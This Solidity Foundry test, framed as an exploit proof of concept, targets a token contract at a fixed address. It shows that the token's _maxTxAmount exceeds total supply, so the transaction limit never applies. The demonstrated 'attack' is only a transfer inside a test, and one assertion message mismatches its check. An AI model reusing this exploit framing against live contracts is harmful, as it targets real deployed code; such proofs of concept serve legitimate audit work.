pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface QAPToken {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x1EB68d088fD07D15b481DbaF219AC2aB61A6c073;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get some QAP tokens for the attacker
        uint256 totalSupply = QAPToken(TARGET).totalSupply();
        deal(TARGET, attacker, 1 * 10**9); // Give attacker 1 token with 9 decimals

        // Label for debugging
        vm.label(TARGET, "QAP Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the total supply
        uint256 totalSupply = QAPToken(TARGET).totalSupply();

        // Get attacker's initial balance
        uint256 attackerInitialBalance = QAPToken(TARGET).balanceOf(attacker);

        console.log("Total supply:", totalSupply);
        console.log("Attacker initial balance:", attackerInitialBalance);
        console.log("_maxTxAmount:", QAPToken(TARGET)._maxTxAmount());

        // Verify the oracle condition first
        assertEq(QAPToken(TARGET)._maxTxAmount(), 5000000000000000000000000000000000, "_maxTxAmount should be 5e33");

        // Create a recipient address
        address recipient = address(0x123);

        // Transfer an amount equal to the attacker's balance (which is less than total supply)
        // This should pass the _maxTxAmount check because _maxTxAmount is huge
        uint256 transferAmount = attackerInitialBalance;

        console.log("Attempting transfer of:", transferAmount);

        // Perform the transfer
        QAPToken(TARGET).transfer(recipient, transferAmount);

        // Verify the transfer succeeded
        uint256 recipientBalance = QAPToken(TARGET).balanceOf(recipient);
        assertEq(recipientBalance, transferAmount, "Transfer should have succeeded");

        // Now demonstrate we could transfer the entire total supply if we had it
        // The check would still pass because totalSupply (1.5e20) <= _maxTxAmount (5e33)
        bool wouldPass = totalSupply <= QAPToken(TARGET)._maxTxAmount();
        assertTrue(wouldPass, "Total supply should be less than _maxTxAmount, making limit ineffective");

        console.log("\nVulnerability demonstrated: Transaction limit is ineffective because:");
        console.log("_maxTxAmount:", QAPToken(TARGET)._maxTxAmount());
        console.log("Total supply:", totalSupply);
        console.log("Ratio (_maxTxAmount / totalSupply):", QAPToken(TARGET)._maxTxAmount() / totalSupply);
        assertEq(QAPToken(TARGET)._maxTxAmount(), 5000000000000000000000000000000000, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

